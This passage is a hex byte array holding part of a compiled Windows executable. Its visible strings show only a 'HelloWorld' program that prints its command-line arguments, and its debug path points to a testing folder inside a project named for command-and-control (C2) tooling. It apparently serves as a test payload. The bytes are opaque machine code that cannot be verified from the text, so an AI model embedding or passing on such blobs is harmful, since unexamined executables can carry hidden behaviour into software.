0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x98, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB6, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5A, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3A, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFA, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xDE, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCA, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7E, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9C, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA6, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x24, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD6, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8A, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE4, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF6, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCC, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9A, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x92, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x56, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1A, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCA, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x18, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x34, 0x18, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x90, 0x1D, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xB0, 0x1D, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xB0, 0x1D, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x72, 0x1D, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x11, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x11, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xD8, 0x11, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x30, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xE0, 0x30, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x43, 0x6F, 0x6D, 0x6D, 0x61, 0x6E, 0x64, 0x2D, 0x6C, 0x69, 0x6E, 0x65, 0x20, 0x61, 0x72, 0x67, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x73, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x3A, 0x0A, 0x00, 0x00, 0x41, 0x72, 0x67, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x20, 0x25, 0x64, 0x3A, 0x20, 0x25, 0x73, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4E, 0x6F, 0x20, 0x63, 0x6F, 0x6D, 0x6D, 0x61, 0x6E, 0x64, 0x2D, 0x6C, 0x69, 0x6E, 0x65, 0x20, 0x61, 0x72, 0x67, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x73, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x2E, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x30, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x21, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xB0, 0x21, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x24, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x21, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xB8, 0x21, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xC0, 0x21, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xC8, 0x21, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0xD0, 0x21, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x60, 0x49, 0x65, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x00, 0x00, 0xD4, 0x24, 0x00, 0x00, 0xD4, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x60, 0x49, 0x65, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x40, 0x25, 0x00, 0x00, 0x40, 0x17, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x60, 0x49, 0x65, 0x00, 0x00, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x84, 0x02, 0x00, 0x00, 0x54, 0x25, 0x00, 0x00, 0x54, 0x17, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x60, 0x49, 0x65, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x02, 0x80, 0x02, 0x80, 0x98, 0x24, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0xC4, 0x24, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0xF3, 0x13, 0x00, 0x00, 0x6F, 0x14, 0x00, 0x00, 0x84, 0x14, 0x00, 0x00, 0x1D, 0x15, 0x00, 0x00, 0x33, 0x15, 0x00, 0x00, 0xD3, 0x16, 0x00, 0x00, 0x2A, 0x19, 0x00, 0x00, 0x5C, 0x19, 0x00, 0x00, 0x3F, 0x1C, 0x00, 0x00, 0x44, 0x1C, 0x00, 0x00, 0x8E, 0x1C, 0x00, 0x00, 0x20, 0x11, 0x00, 0x00, 0xB0, 0x0B, 0x00, 0x00, 0xB6, 0x1D, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x52, 0x53, 0x44, 0x53, 0x22, 0x44, 0x6D, 0x43, 0x8A, 0x31, 0x6F, 0x41, 0xA5, 0xCF, 0x30, 0xC3, 0x14, 0x01, 0x63, 0x54, 0x01, 0x00, 0x00, 0x00, 0x59, 0x3A, 0x5C, 0x43, 0x32, 0x73, 0x5C, 0x53, 0x74, 0x6F, 0x6E, 0x65, 0x4B, 0x65, 0x65, 0x70, 0x65, 0x72, 0x5C, 0x49, 0x6E, 0x66, 0x69, 0x6E, 0x69, 0x74, 0x79, 0x47, 0x61, 0x75, 0x6E, 0x74, 0x6C, 0x65, 0x74, 0x5C, 0x74, 0x65, 0x73, 0x74, 0x69, 0x6E, 0x67, 0x5C, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x57, 0x6F, 0x72, 0x6C, 0x64, 0x5C, 0x78, 0x36, 0x34, 0x5C, 0x52, 0x65, 0x6C, 0x65, 0x61, 0x73, 0x65, 0x5C, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x57, 0x6F, 0x72, 0x6C, 0x64, 0x2E, 0x70, 0x64, 0x62, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1D, 0x00, 0x00, 0x00, 0x1D, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x47, 0x43, 0x54, 0x4C, 0x00, 0x10, 0x00, 0x00, 0x80, 0x0D, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x80, 0x1D, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E, 0x24, 0x30, 0x30, 0x00, 0xB6, 0x1D, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x78, 0x00, 0x00, 0x20, 0x00, 0x00, 0xA0, 0x01, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x35, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x21, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x2E, 0x30, 0x30, 0x63, 0x66, 0x67, 0x00, 0x00, 0xD8, 0x21, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x43, 0x41, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x21, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x43, 0x41, 0x41, 0x00, 0x00, 0x00, 0xE8, 0x21, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x43, 0x5A, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x21, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x41, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x21, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x41, 0x41, 0x00, 0x00, 0x00, 0x00, 0x22, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x41, 0x43, 0x00, 0x00, 0x00, 0x08, 0x22, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x10, 0x22, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x50, 0x41, 0x00, 0x00, 0x00, 0x00, 0x18, 0x22, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x50, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x20, 0x22, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x54, 0x41, 0x00, 0x00, 0x00, 0x00, 0x28, 0x22, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x43, 0x52, 0x54, 0x24, 0x58, 0x54, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x30, 0x22, 0x00, 0x00, 0x50, 0x02, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x80, 0x24, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x76, 0x6F, 0x6C, 0x74, 0x6D, 0x64, 0x00, 0x00, 0x00, 0xD4, 0x24, 0x00, 0x00, 0x04, 0x03, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x7A, 0x7A, 0x7A, 0x64, 0x62, 0x67, 0x00, 0x00, 0x00, 0xD8, 0x27, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x74, 0x63, 0x24, 0x49, 0x41, 0x41, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x27, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x74, 0x63, 0x24, 0x49, 0x5A, 0x5A, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x27, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x74, 0x63, 0x24, 0x54, 0x41, 0x41, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x27, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x74, 0x63, 0x24, 0x54, 0x5A, 0x5A, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x27, 0x00, 0x00, 0x14, 0x01, 0x00, 0x00, 0x2E, 0x78, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x0C, 0x29, 0x00, 0x00, 0x8C, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x32, 0x00, 0x00, 0x00, 0x00, 0x98, 0x29, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x33, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x29, 0x00, 0x00, 0xA0, 0x01, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00, 0x50, 0x2B, 0x00, 0x00, 0x60, 0x04, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x40, 0x30, 0x00, 0x00, 0xF8, 0x05, 0x00, 0x00, 0x2E, 0x62, 0x73, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x8C, 0x01, 0x00, 0x00, 0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x24, 0x30, 0x31, 0x00, 0x00, 0x00, 0x00, 0x60, 0x50, 0x00, 0x00, 0x80, 0x01, 0x00, 0x00, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x24, 0x30, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x1B, 0x04, 0x00, 0x1B, 0x52, 0x17, 0x70, 0x16, 0x60, 0x15, 0x30, 0x01, 0x0A, 0x04, 0x00, 0x0A, 0x64, 0x07, 0x00, 0x0A, 0x32, 0x06, 0x70, 0x21, 0x05, 0x02, 0x00, 0x05, 0x34, 0x06, 0x00, 0x70, 0x10, 0x00, 0x00, 0x8B, 0x10, 0x00, 0x00, 0x04, 0x28, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x70, 0x10, 0x00, 0x00, 0x8B, 0x10, 0x00, 0x00, 0x04, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30, 0x01, 0x04, 0x01, 0x00, 0x04, 0x42, 0x00, 0x00, 0x09, 0x0F, 0x06, 0x00, 0x0F, 0x64, 0x09, 0x00, 0x0F, 0x34, 0x08, 0x00, 0x0F, 0x52, 0x0B, 0x70, 0xD0, 0x1C, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x2D, 0x12, 0x00, 0x00, 0x32, 0x13, 0x00, 0x00, 0xB6, 0x1D, 0x00, 0x00, 0x32, 0x13, 0x00, 0x00, 0x66, 0x13, 0x00, 0x00, 0x78, 0x13, 0x00, 0x00, 0xB6, 0x1D, 0x00, 0x00, 0x32, 0x13, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x50, 0x01, 0x09, 0x01, 0x00, 0x09, 0x62, 0x00, 0x00, 0x01, 0x08, 0x04, 0x00, 0x08, 0x72, 0x04, 0x70, 0x03, 0x60, 0x02, 0x30, 0x09, 0x04, 0x01, 0x00, 0x04, 0x22, 0x00, 0x00, 0xD0, 0x1C, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x2B, 0x16, 0x00, 0x00, 0xB5, 0x16, 0x00, 0x00, 0xD4, 0x1D, 0x00, 0x00, 0xB5, 0x16, 0x00, 0x00, 0x01, 0x02, 0x01, 0x00, 0x02, 0x50, 0x00, 0x00, 0x01, 0x0D, 0x04, 0x00, 0x0D, 0x34, 0x0A, 0x00, 0x0D, 0x52, 0x06, 0x50, 0x01, 0x15, 0x05, 0x00, 0x15, 0x34, 0xBA, 0x00, 0x15, 0x01, 0xB8, 0x00, 0x06, 0x50, 0x00, 0x00, 0x01, 0x0A, 0x04, 0x00, 0x0A, 0x34, 0x06, 0x00, 0x0A, 0x32, 0x06, 0x70, 0x01, 0x0F, 0x06, 0x00, 0x0F, 0x64, 0x06, 0x00, 0x0F, 0x34, 0x05, 0x00, 0x0F, 0x12, 0x0B, 0x70, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x30, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA6, 0x2B, 0x00, 0x00, 0x80, 0x20, 0x00, 0x00, 0x28, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x96, 0x2D, 0x00, 0x00, 0x78, 0x21, 0x00, 0x00, 0x90, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB6, 0x2D, 0x00, 0x00, 0xE0, 0x20, 0x00, 0x00, 0x80, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD8, 0x2D, 0x00, 0x00, 0xD0, 0x20, 0x00, 0x00, 0x70, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x2D, 0x00, 0x00, 0xC0, 0x20, 0x00, 0x00, 0x60, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1A, 0x2E, 0x00, 0x00, 0xB0, 0x20, 0x00, 0x00, 0xB0, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x98, 0x2F, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2A, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4E, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x98, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB6, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5A, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3A, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFA, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xDE, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCA, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7E, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9C, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA6, 0x2F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x24, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD6, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8A, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE4, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF6, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCC, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9A, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x92, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x56, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1A, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCA, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x5F, 0x5F, 0x43, 0x5F, 0x73, 0x70, 0x65, 0x63, 0x69, 0x66, 0x69, 0x63, 0x5F, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x00, 0x00, 0x1B, 0x00, 0x5F, 0x5F, 0x63, 0x75, 0x72, 